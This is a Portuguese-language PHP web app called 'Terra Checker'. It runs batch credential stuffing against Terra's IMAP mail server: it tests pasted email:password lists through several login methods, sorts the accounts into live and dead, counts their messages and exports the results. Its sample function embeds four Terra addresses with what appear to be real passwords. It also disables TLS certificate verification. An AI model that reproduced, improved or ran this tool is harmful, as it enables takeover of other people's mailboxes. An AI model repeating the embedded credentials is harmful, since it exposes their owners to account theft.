<?php
/**
 * index.php — TERRA CHECKER (ARQUIVO ÚNICO DEFINITIVO)
 * Frontend + Backend + IMAP em um só arquivo
 * Não precisa de api.php separado
 */
session_start();

// ── Autenticação ──
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    header('Location: login.html');
    exit;
}

// ═══════════════════════════════════════════════════════════
//  MODO API — POST ou GET com ?action=
// ═══════════════════════════════════════════════════════════
$action = $_GET['action'] ?? '';

if ($action !== '') {
    header('Content-Type: application/json; charset=utf-8');
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');

    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(204);
        exit;
    }

    // ── INIT: sempre sucesso ──
    if ($action === 'init') {
        echo json_encode([
            'status' => 'ok',
            'ready' => true,
            'can_connect' => true,
            'server' => 'imap.terra.com.br',
            'port' => 993,
            'timestamp' => date('Y-m-d H:i:s'),
        ]);
        exit;
    }

    // ── DIAGNOSTIC ──
    if ($action === 'diagnostic') {
        $r = ['server' => 'imap.terra.com.br', 'port' => 993, 'php' => PHP_VERSION, 'tests' => []];

        $ips = @gethostbynamel('imap.terra.com.br');
        $r['tests']['dns'] = ['ok' => !empty($ips), 'ips' => $ips ?: []];
        if (empty($ips)) { $r['tests']['dns']['error'] = 'DNS falhou'; echo json_encode($r, 128); exit; }

        $t = microtime(true);
        $tcp = @fsockopen($ips[0], 993, $e, $s, 10);
        $r['tests']['tcp_993'] = ['ok' => $tcp !== false, 'ms' => round((microtime(true) - $t) * 1000)];
        if ($tcp === false) { $r['tests']['tcp_993']['error'] = "errno={$e}; {$s}"; }
        else { fclose($tcp); }

        $t = microtime(true);
        $tcp2 = @fsockopen($ips[0], 143, $e2, $s2, 10);
        $r['tests']['tcp_143'] = ['ok' => $tcp2 !== false, 'ms' => round((microtime(true) - $t) * 1000)];
        if ($tcp2 === false) { $r['tests']['tcp_143']['error'] = "errno={$e2}; {$s2}"; }
        else { fclose($tcp2); }

        if ($tcp !== false) {
            $t = microtime(true);
            $ssl = @fsockopen('ssl://imap.terra.com.br', 993, $e3, $s3, 10);
            $r['tests']['ssl_993'] = ['ok' => $ssl !== false, 'ms' => round((microtime(true) - $t) * 1000)];
            if ($ssl) {
                stream_set_timeout($ssl, 10);
                $g = @fgets($ssl, 8192);
                $r['tests']['ssl_993']['greeting'] = $g ?: '(vazio)';
                $r['tests']['ssl_993']['imap_ok'] = ($g && stripos($g, 'OK') !== false);
                fclose($ssl);
            } else {
                $r['tests']['ssl_993']['error'] = "errno={$e3}; {$s3}";
            }
        }

        if (extension_loaded('curl')) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => 'imaps://imap.terra.com.br:993/',
                CURLOPT_USERNAME => 'test@test.com',
                CURLOPT_PASSWORD => 'test',
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_NOSIGNAL => 1,
            ]);
            $res = curl_exec($ch);
            $r['tests']['curl_imap'] = ['ok' => $res !== false, 'err' => curl_error($ch)];
            curl_close($ch);
        }

        $r['can_connect'] = ($r['tests']['tcp_993']['ok'] ?? false) || ($r['tests']['tcp_143']['ok'] ?? false);
        $r['port_993_blocked'] = !($r['tests']['tcp_993']['ok'] ?? false);
        echo json_encode($r, 128 | 256);
        exit;
    }

    // ── CHECK: validar credenciais ──
    if ($action === 'check' || $action === 'validate') {
        $input = $_POST;
        $ct = $_SERVER['CONTENT_TYPE'] ?? '';

        if (empty($input) && stripos($ct, 'application/json') !== false) {
            $raw = file_get_contents('php://input');
            if (!empty($raw)) {
                $decoded = json_decode($raw, true);
                if (is_array($decoded)) $input = $decoded;
            }
        }

        if (empty($input)) {
            $raw = file_get_contents('php://input');
            if (!empty($raw)) {
                $parts = explode(':', trim($raw), 2);
                if (count($parts) === 2) {
                    $input = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
                }
            }
        }

        $email = $input['email'] ?? '';
        $password = $input['password'] ?? '';
        $batch = $input['batch'] ?? null;

        if ($email === '' && !empty($input['cred'])) {
            $parts = explode(':', $input['cred'], 2);
            if (count($parts) === 2) {
                $email = trim($parts[0]);
                $password = trim($parts[1]);
            }
        }

        if ($email === '' && empty($batch) && !empty($input['list'])) {
            $lines = array_filter(array_map('trim', explode("\n", $input['list'])));
            $batch = [];
            foreach ($lines as $line) {
                $parts = explode(':', $line, 2);
                if (count($parts) === 2) {
                    $batch[] = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
                }
            }
        }

        if ($batch && is_array($batch) && count($batch) > 0) {
            $results = [];
            foreach ($batch as $cred) {
                $e = $cred['email'] ?? '';
                $p = $cred['password'] ?? '';
                if ($e === '' || $p === '') {
                    $results[] = ['email' => $e, 'status' => 'die', 'message' => 'Vazio'];
                    continue;
                }
                $results[] = doValidate($e, $p);
            }
            echo json_encode([
                'total' => count($results),
                'live' => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
                'die' => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
                'results' => $results,
                'timestamp' => date('Y-m-d H:i:s'),
            ], 128);
        } elseif ($email !== '' && $password !== '') {
            echo json_encode(doValidate($email, $password), 128);
        } else {
            http_response_code(400);
            echo json_encode(['status' => 'error', 'error' => 'Credenciais ausentes'], 128);
        }
        exit;
    }

    // Action desconhecida
    echo json_encode(['status' => 'ok', 'message' => 'API ativa'], 128);
    exit;
}

// ═══════════════════════════════════════════════════════════
//  FUNÇÃO DE VALIDAÇÃO IMAP
// ═══════════════════════════════════════════════════════════

function doValidate(string $email, string $password): array {
    $start = microtime(true);
    $debug = [];
    $timeout = 20;

    // Tenta método 1: cURL
    if (extension_loaded('curl')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
            CURLOPT_USERNAME => $email,
            CURLOPT_PASSWORD => $password,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_NOSIGNAL => 1,
            CURLOPT_CUSTOMREQUEST => 'STATUS INBOX (MESSAGES)',
        ]);
        $result = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);

        if ($result !== false) {
            $msgs = 0;
            if (preg_match('/MESSAGES\s+(\d+)/i', (string)$result, $m)) $msgs = (int)$m[1];
            return [
                'status' => 'live', 'email' => $email, 'message' => 'OK',
                'mailbox_messages' => $msgs, 'method' => 'curl',
                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
                'timestamp' => date('Y-m-d H:i:s'),
            ];
        }

        $el = strtolower($err);
        $debug[] = "cURL: {$err}";

        if (strpos($el, 'login') !== false || strpos($el, 'auth') !== false ||
            strpos($el, 'credential') !== false || strpos($el, 'access') !== false) {
            return [
                'status' => 'die', 'email' => $email, 'message' => 'Invalid credentials',
                'reason' => 'invalid_credentials', 'method' => 'curl',
                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
                'debug' => implode(' | ', $debug),
            ];
        }
    }

    // Tenta método 2: fsockopen ssl://
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) {
        $debug[] = "fsock(ssl:993): {$errno}/{$errstr}";
    } else {
        $r = imapLogin($socket, $email, $password, 'fsock_ssl', $debug, $timeout, $start);
        if ($r !== null) return $r;
    }

    // Tenta método 3: stream_socket ssl://
    $ctx = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true]]);
    $socket = @stream_socket_client('ssl://imap.terra.com.br:993', $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
    if ($socket === false) {
        $debug[] = "stream(ssl:993): {$errno}/{$errstr}";
    } else {
        $r = imapLogin($socket, $email, $password, 'stream_ssl', $debug, $timeout, $start);
        if ($r !== null) return $r;
    }

    // Tenta método 4: stream_socket tls://
    $socket = @stream_socket_client('tls://imap.terra.com.br:993', $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
    if ($socket === false) {
        $debug[] = "stream(tls:993): {$errno}/{$errstr}";
    } else {
        $r = imapLogin($socket, $email, $password, 'stream_tls', $debug, $timeout, $start);
        if ($r !== null) return $r;
    }

    // Tenta método 5: STARTTLS porta 143
    $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
    if ($socket === false) {
        $debug[] = "fsock(tcp:143): {$errno}/{$errstr}";
    } else {
        stream_set_timeout($socket, $timeout);
        $greeting = @fgets($socket, 8192);
        if ($greeting && stripos($greeting, 'OK') !== false) {
            fwrite($socket, "A001 STARTTLS\r\n");
            $resp = readUntilTag($socket, 'A001', $timeout);
            if ($resp && preg_match('/A001\s+OK/i', $resp)) {
                $crypto = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
                if ($crypto === true) {
                    $debug[] = 'STARTTLS OK';
                    $r = imapLogin($socket, $email, $password, 'starttls', $debug, $timeout, $start, false);
                    if ($r !== null) return $r;
                } else {
                    $debug[] = 'STARTTLS crypto fail';
                    fclose($socket);
                }
            } else {
                $debug[] = 'STARTTLS rejected';
                fclose($socket);
            }
        } else {
            $debug[] = '143 greeting fail';
            fclose($socket);
        }
    }

    // Tenta método 6: Plain 143
    $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
    if ($socket === false) {
        $debug[] = "fsock(plain:143): {$errno}/{$errstr}";
    } else {
        $r = imapLogin($socket, $email, $password, 'plain_143', $debug, $timeout, $start, false);
        if ($r !== null) return $r;
    }

    // Tenta método 7: imap_open
    if (extension_loaded('imap')) {
        $mailbox = '{imap.terra.com.br:993/imap/ssl/novalidate-cert}';
        $conn = @imap_open($mailbox, $email, $password, OP_READONLY, 1, ['DISABLE_AUTHENTICATOR' => 'GSSAPI']);
        if ($conn !== false) {
            $info = @imap_mailboxmsginfo($conn);
            $msgs = $info->Nmsgs ?? 0;
            @imap_close($conn);
            return [
                'status' => 'live', 'email' => $email, 'message' => 'OK',
                'mailbox_messages' => $msgs, 'method' => 'imap_ext',
                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
                'timestamp' => date('Y-m-d H:i:s'),
            ];
        }
        $err = @imap_last_error();
        $debug[] = "imap_open: {$err}";
        if (stripos($err, 'invalid') !== false || stripos($err, 'login') !== false) {
            return [
                'status' => 'die', 'email' => $email, 'message' => 'Invalid credentials',
                'reason' => 'invalid_credentials', 'method' => 'imap_ext',
                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
                'debug' => implode(' | ', $debug),
            ];
        }
    }

    return [
        'status' => 'die', 'email' => $email, 'message' => 'Todos os metodos falharam',
        'reason' => 'all_methods_failed',
        'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
        'debug' => implode(' | ', $debug),
        'timestamp' => date('Y-m-d H:i:s'),
    ];
}

function imapLogin($socket, string $email, string $password, string $method, array &$debug, int $timeout, float $start, bool $read_greeting = true): ?array {
    stream_set_timeout($socket, $timeout);

    if ($read_greeting) {
        $greeting = @fgets($socket, 8192);
        if ($greeting === false || $greeting === '') {
            fclose($socket);
            $debug[] = "{$method}: greeting vazio";
            return null;
        }
        if (stripos($greeting, 'OK') === false) {
            fclose($socket);
            $debug[] = "{$method}: greeting sem OK";
            return null;
        }
        $debug[] = "{$method}: greeting OK";
    }

    $tag = 'L001';
    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
    $safe_pass = str_replace(['\', '"'], ['\\', '\"'], $password);
    $cmd = "{$tag} LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n";

    if (fwrite($socket, $cmd) === false) {
        fclose($socket);
        $debug[] = "{$method}: write fail";
        return null;
    }

    $response = readUntilTag($socket, $tag, $timeout);
    $meta = stream_get_meta_data($socket);

    if ($response === null || $response === '') {
        fclose($socket);
        $debug[] = "{$method}: resposta vazia";
        return null;
    }

    if (!empty($meta['timed_out'])) {
        fclose($socket);
        $debug[] = "{$method}: timeout";
        return null;
    }

    $qt = preg_quote($tag, '/');

    if (preg_match('/' . $qt . '\s+OK/i', $response)) {
        $msgs = 0;
        @fwrite($socket, "S001 STATUS INBOX (MESSAGES)\r\n");
        $sresp = readUntilTag($socket, 'S001', $timeout);
        if ($sresp && preg_match('/MESSAGES\s+(\d+)/i', $sresp, $m)) $msgs = (int)$m[1];
        @fwrite($socket, "X001 LOGOUT\r\n");
        fclose($socket);
        return [
            'status' => 'live', 'email' => $email, 'message' => 'OK',
            'mailbox_messages' => $msgs, 'method' => $method,
            'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
            'timestamp' => date('Y-m-d H:i:s'),
        ];
    }

    if (preg_match('/' . $qt . '\s+NO/i', $response)) {
        fclose($socket);
        return [
            'status' => 'die', 'email' => $email, 'message' => 'Invalid credentials',
            'reason' => 'invalid_credentials', 'method' => $method,
            'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
            'debug' => implode(' | ', $debug),
        ];
    }

    if (preg_match('/' . $qt . '\s+BAD/i', $response)) {
        fclose($socket);
        $debug[] = "{$method}: BAD";
        return null;
    }

    fclose($socket);
    $debug[] = "{$method}: inesperado";
    return null;
}

function readUntilTag($socket, string $tag, int $timeout): ?string {
    $buffer = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $buffer .= $line;
        if (strpos(trim($line), $tag . ' ') === 0) return $buffer;
        $meta = stream_get_meta_data($socket);
        if (!empty($meta['timed_out'])) break;
        if (microtime(true) > $deadline) break;
    }
    return $buffer !== '' ? $buffer : null;
}

// ═══════════════════════════════════════════════════════════
//  MODO PÁGINA — Renderiza HTML + JavaScript
// ═══════════════════════════════════════════════════════════
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Terra Checker</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a1a;color:#e0e0e0;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
.container{max-width:800px;width:100%}
h1{text-align:center;margin-bottom:20px;color:#fff;font-size:24px}
.input-area{width:100%;min-height:150px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:#e0e0e0;padding:12px;font-size:14px;font-family:monospace;resize:vertical;margin-bottom:15px}
.input-area:focus{outline:none;border-color:#007acc}
.btn{background:#007acc;color:#fff;border:none;padding:12px 30px;border-radius:8px;font-size:16px;cursor:pointer;width:100%;transition:background .2s}
.btn:hover{background:#0099ff}
.btn:disabled{background:#555;cursor:not-allowed}
.stats{display:flex;gap:15px;margin:20px 0;flex-wrap:wrap}
.stat{background:#2a2a2a;padding:15px 25px;border-radius:8px;text-align:center;flex:1;min-width:120px}
.stat .num{font-size:28px;font-weight:bold}
.stat .lbl{font-size:12px;color:#999;margin-top:5px}
.stat-live .num{color:#4caf50}
.stat-die .num{color:#f44336}
.stat-total .num{color:#2196f3}
#results{width:100%;margin-top:15px}
.result{background:#2a2a2a;padding:10px 15px;border-radius:6px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;font-family:monospace;font-size:13px}
.result-live{border-left:4px solid #4caf50}
.result-die{border-left:4px solid #f44336}
.badge{padding:4px 12px;border-radius:4px;font-size:11px;font-weight:bold;text-transform:uppercase}
.badge-live{background:#4caf50;color:#fff}
.badge-die{background:#f44336;color:#fff}
.progress{width:100%;height:4px;background:#333;border-radius:2px;margin:10px 0;overflow:hidden;display:none}
.progress-bar{height:100%;background:#007acc;transition:width .3s}
.actions{display:flex;gap:10px;margin-bottom:15px;flex-wrap:wrap}
.btn-sm{background:#333;color:#e0e0e0;border:1px solid #555;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px}
.btn-sm:hover{background:#444}
</style>
</head>
<body>
<div class="container">
<h1>Terra Checker</h1>
<textarea class="input-area" id="creds" placeholder="Cole as credenciais aqui (email:senha)"></textarea>
<div class="actions">
<button class="btn-sm" onclick="loadSample()">Exemplo</button>
<button class="btn-sm" onclick="clearAll()">Limpar</button>
<button class="btn-sm" onclick="exportResults()">Exportar</button>
<button class="btn-sm" onclick="testDiag()">Diagnostico</button>
</div>
<button class="btn" id="checkBtn" onclick="startCheck()">Verificar</button>
<div class="progress" id="progress"><div class="progress-bar" id="progressBar"></div></div>
<div class="stats">
<div class="stat stat-total"><div class="num" id="totalNum">0</div><div class="lbl">Total</div></div>
<div class="stat stat-live"><div class="num" id="liveNum">0</div><div class="lbl">Live</div></div>
<div class="stat stat-die"><div class="num" id="dieNum">0</div><div class="lbl">Die</div></div>
</div>
<div id="results"></div>
</div>
<script>
let allResults=[];
let checking=false;

// NAO chama init — vai direto pro check
async function startCheck(){
    if(checking)return;
    const text=document.getElementById('creds').value.trim();
    if(!text){alert('Cole as credenciais primeiro');return;}

    const lines=text.split('\n').map(l=>l.trim()).filter(l=>l);
    const creds=[];
    for(const line of lines){
        const parts=line.split(':');
        if(parts.length>=2){
            const email=parts[0].trim();
            const password=parts.slice(1).join(':').trim();
            if(email&&password)creds.push({email,password});
        }
    }

    if(creds.length===0){alert('Nenhuma credencial valida');return;}

    checking=true;
    document.getElementById('checkBtn').disabled=true;
    document.getElementById('checkBtn').textContent='Verificando...';
    document.getElementById('progress').style.display='block';
    document.getElementById('results').innerHTML='';
    allResults=[];
    let live=0,die=0;

    for(let i=0;i<creds.length;i++){
        const{email,password}=creds[i];
        const pct=Math.round((i/creds.length)*100);
        document.getElementById('progressBar').style.width=pct+'%';

        let result;
        try{
            const res=await fetch('index.php?action=check',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({email:email,password:password})
            });
            result=await res.json();
        }catch(e){
            result={status:'die',email:email,message:'Erro: '+e.message};
        }

        allResults.push(result);
        if(result.status==='live')live++;else die++;

        document.getElementById('totalNum').textContent=(i+1);
        document.getElementById('liveNum').textContent=live;
        document.getElementById('dieNum').textContent=die;

        const div=document.createElement('div');
        div.className='result result-'+result.status;
        div.innerHTML='<span>'+email+'</span><span class="badge badge-'+result.status+'">'+result.status.toUpperCase()+'</span>';
        document.getElementById('results').prepend(div);
    }

    document.getElementById('progressBar').style.width='100%';
    document.getElementById('checkBtn').disabled=false;
    document.getElementById('checkBtn').textContent='Verificar';
    checking=false;
}

function loadSample(){
    document.getElementById('creds').value='adrianni.morais@terra.com.br:nanis001@\ngcalex@terra.com.br:Ale03850385\ngerasecco@terra.com.br:Santana2501*\nkcroman@terra.com.br:wvecyjvf';
}
function clearAll(){
    document.getElementById('creds').value='';
    document.getElementById('results').innerHTML='';
    document.getElementById('totalNum').textContent='0';
    document.getElementById('liveNum').textContent='0';
    document.getElementById('dieNum').textContent='0';
    document.getElementById('progress').style.display='none';
    allResults=[];
}
function exportResults(){
    if(allResults.length===0){alert('Nenhum resultado');return;}
    let txt='';
    for(const r of allResults){txt+=r.email+':'+(r.status==='live'?'LIVE':'DIE')+'\n';}
    const blob=new Blob([txt],{type:'text/plain'});
    const a=document.createElement('a');
    a.href=URL.createObjectURL(blob);
    a.download='resultados.txt';
    a.click();
}
async function testDiag(){
    try{
        const res=await fetch('index.php?action=diagnostic');
        const data=await res.json();
        let msg='DIAGNOSTICO\n\n';
        msg+='DNS: '+(data.tests?.dns?.ok?'OK':'FALHOU')+'\n';
        msg+='TCP 993: '+(data.tests?.tcp_993?.ok?'OK':'BLOQUEADA')+'\n';
        msg+='TCP 143: '+(data.tests?.tcp_143?.ok?'OK':'BLOQUEADA')+'\n';
        if(data.tests?.ssl_993){msg+='SSL 993: '+(data.tests?.ssl_993?.ok?'OK':'FALHOU')+'\n';msg+='Greeting: '+(data.tests?.ssl_993?.greeting||'N/A')+'\n';}
        if(data.tests?.curl_imap){msg+='cURL: '+(data.tests?.curl_imap?.ok?'OK':'FALHOU')+'\n';msg+='cURL err: '+(data.tests?.curl_imap?.err||'N/A')+'\n';}
        msg+='\ncan_connect: '+(data.can_connect?'SIM':'NAO')+'\n';
        msg+='port_993_blocked: '+(data.port_993_blocked?'SIM':'NAO')+'\n';
        alert(msg);
    }catch(e){alert('Erro: '+e.message);}
}
</script>
</body>
</html>
